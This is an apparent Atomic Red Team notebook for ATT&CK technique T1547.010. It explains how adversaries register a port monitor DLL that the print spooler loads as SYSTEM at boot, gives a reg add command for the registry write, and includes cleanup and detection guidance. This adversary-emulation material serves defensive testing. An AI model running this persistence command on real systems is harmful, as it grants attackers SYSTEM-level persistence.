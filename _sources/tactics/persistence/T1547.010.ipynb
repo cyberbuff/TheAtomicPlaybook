{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "37e0f7aa",
   "metadata": {},
   "source": "# T1547.010 - Port Monitors\nAdversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM."
  },
  {
   "cell_type": "markdown",
   "id": "d84da1cd",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "9d228185",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Add Port Monitor persistence in Registry",
    "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"$PathToAtomicsFolder\\T1547.010\\bin\\PortMonitor.dll\" /t REG_SZ /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95f01586",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.010 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "52be875a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0aabb7c4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.010 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7555248a",
   "metadata": {},
   "source": "## Detection\nMonitor process API calls to <code>AddMonitor</code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \n\nMonitor Registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism.(Citation: TechNet Autoruns)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}